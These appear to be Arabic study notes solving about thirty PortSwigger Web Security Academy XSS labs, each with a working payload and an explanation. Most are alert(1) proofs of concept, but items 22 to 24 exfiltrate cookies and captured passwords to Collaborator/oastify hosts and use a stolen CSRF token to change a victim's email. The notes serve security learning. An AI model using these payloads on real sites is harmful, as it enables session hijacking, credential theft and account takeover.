

---

1) # Lab: Reflected XSS into HTML context with nothing encoded 
     هنااا نوع الثغره Reflected فلازم ندور على حاجه فى الريكويست فهنا هنلاقى البحث فهنكتب ده فيه 
     <script>alert(1)</script>
---
2) # Stored XSS into HTML context with nothing encoded 
     هنااا النوع stored  فطبعا لازم حاجه تكون بتتخزن فى الداتا بيز فهنشوف الكومنتات وهنكتب الكومنت ده  <script>alert(1)</script>
---
3) # Lab: DOM XSS in `document.write` sink using source `location.search` 
	payload =>  ">< svg onload=alert(1)> 
---
4) Lab: DOM XSS in innerHTML sink using source location.search   
     حل الاب ده <img src="1" onerror="alert(1)">
---
5) Lab: DOM XSS in jQuery anchor href attribute sink using location.search source 
     الفكره هنا ان هتفتح ال فيد باك وتستخدم ده `javascript:alert(document.cookie)`  ده بقا علشان لما ترجع خطوه ينفذ ال alert 
---
6) # Lab: DOM XSS in jQuery selector sink using a hashchange event 
     بتحصل لما الموقع ياخد بيانات يقدر المستخدم يتحكم فيها من الـ **URL** ويستخدمها مباشرة داخل JavaScript بطريقة تسمح بتنفيذ HTML/JavaScript. الموقع بياخد الجزء بعد `#` من الـ URL باستخدام 
       location.hash
       وبعدين يمرره إلى: $(location.hash)  وده هو **الـ Sink**.
    المشكلة إن `$()` في الحالة دي ممكن يتعامل مع المدخل كـ HTML، وبالتالي المهاجم يقدر يستغل الـ hash لتنفيذ JavaScript.
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> 
---
7) # Lab: Reflected XSS into attribute with angle brackets HTML-encoded
     الثغره هنا فى input ونستخدم  "onmouseover="alert(1) 
---
8) # Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded 
     هنا داخل ال attribute فى href  مش ينفع تستخدم ""  وهتكتب اسم الموقع ال href هيروح عليه  
     javascript:alert(1)  علشان لو ضغط على الاسم الكود ده يتنفذ
---
9)  # Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded   
     الفكره هنا انتا فى متغير وفى ثغره انك تستخدم " '  فهتطلع من المتغير وتستخدم '-alert(1)-' 
---
10)  # Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
     **المشكلة:** الموقع بياخد قيمة من الـ URL ويكتبها مباشرة داخل HTML باستخدام `document.write()`.
     &storeId="></select><img%20src=1%20onerror=alert(1)>
---
11) # Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
     AngularJS قيّم expression → وصلنا للـ Function constructor → أنشأنا Function فيها `alert(1)` → شغّلناها.  
     {{$on.constructor('alert(1)')()}} 
---
12)  # Lab: Reflected DOM XSS
     **Reflected DOM XSS:** ثغرة بيتم فيها عكس input المستخدم في الـ response، ثم JavaScript يعالجه بشكل غير آمن داخل الـ DOM.  
    **الفكرة:** `User Input → Server Reflection → JavaScript → DOM Sink → XSS` 
     use => "-alert(1)}//  

---
13) Stored DOM XSS 
     **Stored DOM XSS:** الـ input بيتخزن على السيرفر/Database، وبعدها JavaScript بيقرأ البيانات المخزنة ويحطها في **DOM Sink** بطريقة غير آمنة.
     use =>   <img src=1 onerror=alert(1)>
---
14)  # Lab: Reflected XSS into HTML context with most tags and attributes blocked 
     use=> ال فى الاب 
     Reflected XSS في HTML context مع Filter بيمنع معظم الـ tags/attributes. الحل هو استخدام Burp Intruder لاكتشاف العناصر والـ attributes المسموح بها، ثم دمج المسموح منها في Payload يؤدي لتنفيذ JavaScript.
---
15) # Lab: Reflected XSS into HTML context with all tags blocked except custom ones
     فلتر XSS ممكن يمنع الـ tags التقليدية، لكن ده مش معناه إن XSS مستحيلة. لازم تفهم بالضبط إيه اللي الفلتر يسمح به 
     الـ input ينعكس داخل الـ HTML، لكن الـ Filter يمنع الـ HTML Tags العادية ويسمح بالـ Custom Tags فقط.    يعنى لو كتبت تاج وجواها اى حاجه بيعدى عادى  
    <script>
         location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
     </script>
---
16) # Lab: Reflected XSS with some SVG markup allowed 
     انتا هنا هتجرب تاج ومش هتنفع هتفتح بيرب ترودر وتشوف التاج ال ينفع والاتربيوت كمان 
---
17) Lab: Reflected XSS in canonical link tag
     **الـ Lab:** الـ input ينعكس داخل `href` الخاص بـ `canonical`، والـ `<` و`>` معمول لهم escaping.  
    **الحل:** نكسر قيمة الـ attribute بـ `'`، ثم نحقن `accesskey` و`onclick` لتشغيل `alert(1)` عند استخدام اختصار لوحة المفاتيح.    ?'accesskey='x'onclick='alert(1)
---
18) # Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped 
      </script> <script>  alert(1)</script>  
      الفكره هنا انتا بتكتب داخل اسكربت فهتقفلها وتفتح واحده جديده وتنفذ الامر   
---
19) # Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
     الـ input بيتحط داخل JavaScript string: var searchTerms = 'USER_INPUT';
	الموقع بيعمل escape للـ ' وHTML-encode لـ < > ".
	الهدف إنك تخرج من الـ JavaScript string بطريقة تتجاوز الـ escaping.
	لذلك بنركز على JavaScript context وليس HTML context.
	خ\'-alert(1)// محاولة لكسر الـ string وتشغيل alert(1) ثم تعليق باقي الكود.
---
20) # Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped 
     'http://foo?'-alert(1)-''   
     Stored XSS هنا بيحصل لأن الـ input المخزن بيتحط داخل `onclick` كـ **JavaScript**، والحماية بتمنع بعض الرموز، فالمطلوب كسر الـ JavaScript context بطريقة تتجاوز الـ escaping.
---
21) Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped 
    في الـ Lab ده، الـ context هو **JavaScript template literal**، والحل يعتمد على `${...}` لأنها تقدر تنفّذ expression من داخل الـ template literal.
    الـ **backticks** `` ` `` معناها إن JavaScript بيستخدم **Template Literal**.
    ${alert(1)}  
---
22) # Lab: Exploiting cross-site scripting to steal cookies
      <script> 
         fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
        {
        method: 'POST',
         mode: 'no-cors', 
         body:document.cookie 
        }); 
        </script>
     XSS يسمح لك بتشغيل JavaScript داخل متصفح الضحية، وإذا كانت Session Cookie قابلة للقراءة، يمكن للكود سرقتها واستخدامها لانتحال جلسة الضحية.  
     وانتا بعد ما تخلص ده هتروح للسرفير وتاخد السيشن وتفتح البرب وتروح على الاكونت وتوقف الطلب وتغير السيشن  وكدا تبقا ادمن 
---
23) Lab: Exploiting cross-site scripting to capture passwords 
	<input name="username" id="username" type="text">
	<input name="password" id="password" onchange=" if(this.value){
	    fetch('https://tfca8fb75pn1atiwfr8n4v55vw1npdd2.oastify.com',
	        {
	            method:'POST',
	            mode:'no-cors',
	            body:'username='+username.value+'& password='+this.value
	        });}">
	    الفكره هنا ان الكومنتات مصابه بثغره وتقدر تنفد اى كود وده يجيب يوزر نيم وباسورد 
---
24) # Lab: Exploiting XSS to bypass CSRF defenses 
      <script>
	var req = new XMLHttpRequest();
	req.onload = handleResponse;
	req.open('get','/my-account',true);
	req.send();
	function handleResponse() {
	    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	    var changeReq = new XMLHttpRequest();
	    changeReq.open('post', '/my-account/change-email', true);
	    changeReq.send('csrf='+token+'&email=test@test.com')
	};
	</script>
	هو فى الاب ده ثغره xss فى الكومنتات وفيه كمان csrf 
	فكرة الـ **Lab: Exploiting XSS to bypass CSRF defenses** ببساطة:
	الموقع بيحاول يحمي عملية **تغيير الإيميل** باستخدام **CSRF Token**.
	لكن فيه **XSS** في الموقع.
	فالمهاجم يستغل الـ XSS عشان JavaScript يقدر:
	1. يدخل على `/my-account`.
	2. يقرأ الـ **CSRF Token** من الصفحة.
	3. يستخدم الـ Token الصحيح.
	4. يرسل طلب تغيير الإيميل.
	5. السيرفر يقبل الطلب لأن الـ CSRF Token صحيح.
	يعني احفظها:
	**XSS → سرقة CSRF Token → استخدامه في الطلب → تجاوز حماية CSRF ✅**
	والهدف من اللاب هو إثبات إن **CSRF Token مش كفاية لحماية التطبيق لو فيه XSS**.
---
25) # Lab: Reflected XSS with AngularJS sandbox escape without strings
    بص، خلّينا نبسطها جدًا:
	
	الـLab ده عبارة عن **Reflected XSS داخل AngularJS**، لكن AngularJS عنده Sandbox بتحاول تمنع تنفيذ JavaScript مباشر.
	
	### الفكرة في 4 خطوات
	
	**1. الـInput بتاعك يدخل AngularJS**
	
	بدل ما Angular تتعامل معاه كنص عادي، بتفسره كـ expression:
	
	```text
	{{ ... }}
	```
	
	**2. نحتاج نتجاوز الـSandbox**
	
	بنستغل طريقة للوصول إلى `constructor`:
	
	```text
	toString().constructor
	```
	
	وده بيساعدنا نوصل لأشياء في JavaScript بدون كتابة `"alert"` كـ string.
	
	**3. نكوّن الكود بالأرقام**
	
	نستخدم:
	
	```text
	fromCharCode(120,61,97,108,101,114,116,40,49,41)
	```
	
	الأرقام دي تمثل حروف، والناتج هو:
	
	```text
	x=alert(1)
	```
	
	يعني بدل ما نكتب:
	
	```text
	"alert(1)"
	```
	
	إحنا **كوّناها من أرقام**، وده سبب كلمة **without strings** في اسم الـLab.
	
	**4. في النهاية يحصل XSS**
	
	بعد تجاوز الـSandbox، AngularJS تفسر الناتج ككود، فيتنفذ:
	
	```text
	alert(1)
	```
	
	### احفظها كده 🧠
	
	**Angular expression → Sandbox bypass → تكوين الكود بالأرقام → JavaScript execution → XSS**
	
	وده الهدف الأساسي من الـLab، مش مجرد حفظ الـpayload؛ المهم تفهم إن **AngularJS نفسها هي 
	الـcontext اللي بيحصل فيه التنفيذ**.
	
	payload => &toString().constructor.prototype.charAt%3d[ ].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 
	
	وهو هنا  ممكن تعمل بارميتر هنا بس الثغره بتبقا فى اسمه واى كود بتكتبه مكان الاسم بيتنفذ 
	وهتكتب الحاجات ال هتعديك من الحمايه وبعدين الكود تحوله لى ASSCI CODE  ويتحول الارقام وبعدين تكتبه .
---
26) Lab: Reflected XSS with AngularJS sandbox escape and CSP
	الفكرة باختصار:
	
	- الـinput بتاعك بيتفسر كـ **AngularJS expression**.
	- AngularJS عندها **Sandbox** بتحاول تمنع تنفيذ JavaScript.
	- بنستغل **sandbox escape** لتجاوزها.
	- لكن فيه **CSP** بتمنع أساليب JavaScript التقليدية، زي inline `<script>`.
	- لذلك بنستخدم طريقة تنفيذ متوافقة مع قيود AngularJS وCSP للوصول في النهاية إلى **XSS**.
	payload => <script> location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>
---
27) # Lab: Reflected XSS with event handlers and `href` attributes blocked 
	هو هنا مانع شويه عناصر فهتستخدم الانترودر فى البيرب وهتشوف هو سامح ب ايه 
	**الفكرة ببساطة:**
	- `onclick` و `onfocus` وغيرها **محظورة**.
	- `href` العادي **محظور**.
	- لذلك نستغل عناصر **SVG**، وبالتحديد `<animate>`، لتغيير قيمة `href` ديناميكيًا.
	- النتيجة النهائية: تنفيذ `alert(1)` وبالتالي إثبات وجود **Reflected XSS**.
	payload=><svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg> 
---
28)  # Lab: Reflected XSS in a JavaScript URL with some characters blocked      
	الفكرة الأساسية إن الـ input بتاعك بيتحط داخل **JavaScript URL**، لكن السيرفر بيعمل فلترة لبعض الحروف. 
	 pay load => &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
	 - `x =>` عبارة عن **arrow function**.
	- `throw` بيرمي قيمة/خطأ.
	- `onerror=alert` بيجعل `window.onerror` يشير إلى `alert`.
	- `1337` هي القيمة اللي يتم تمريرها للـ `alert`.
	يعني الفكرة الأساسية هي **تشغيل `alert(1337)` بطريقة غير مباشرة** بدل كتابة `alert(1337)` بشكل مباشر.
	 - `toString=x` → استبدال `toString` بالدالة `x`.
	- `window+''` → تحويل `window` إلى string أثناء تقييم التعبير.
	- `,{x:'` → إكمال الـ object/expression المطلوب للـ context.
	**الخلاصة:** الـ payload بيكسر الـ JavaScript context، ويستخدم `arrow function` و`onerror` مع **URL encoding** لتجاوز الحروف المحظورة والوصول إلى تنفيذ `alert(1337)`.
	 
---
29) # Lab: Reflected XSS protected by very strict CSP, with dangling markup attack 
	الـ **CSP** مانع تنفيذ JavaScript، فحتى لو قدرت تعمل XSS عادي، السكربت غالبًا مش هيتنفذ.
	بدل كده، **Dangling Markup** بيستغل إن الـ input بتاعك بيتحط داخل HTML، فتقدر تبدأ HTML element أو attribute وتخلي المتصفح يعتبر جزءًا كبيرًا من الصفحة جزءًا من القيمة
---
30)   # Lab: Reflected XSS protected by CSP, with CSP bypass  
	 **ملخص فكرة اللاب:**
	- يوجد **Reflected XSS**.
	- الـ **CSP** تمنع تنفيذ الـJavaScript.
	- التطبيق يسمح للمستخدم بالتأثير في جزء من **CSP Header**.
	- نستغل ده لحقن directive تضعف الـCSP مثل `unsafe-inline`.
	- بعدها يتم تنفيذ الـXSS.
	**الخلاصة:**  
	`Reflected XSS → CSP تمنع التنفيذ → CSP Injection → CSP Bypass → XSS يعمل`
	payload => <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline' 
	- `<script>alert(1)</script>` → ده **XSS Payload**، هدفه تنفيذ JavaScript وإظهار `alert(1)`.
	- `&token=` → بداية parameter اسمه `token`.
	- `;` → بتُنهي الجزء السابق وتبدأ **CSP directive** جديدة.
	- `script-src-elem` → بتحدد سياسة تنفيذ عناصر `<script>`.
	- `'unsafe-inline'` → تسمح بتشغيل **inline JavaScript**.
	**الفكرة كلها:** الـXSS موجود، لكن الـCSP بتمنعه؛ فنحقن في الـCSP نفسها directive تسمح بالـinline script، فيقدر الـXSS يشتغل.
	
--- 
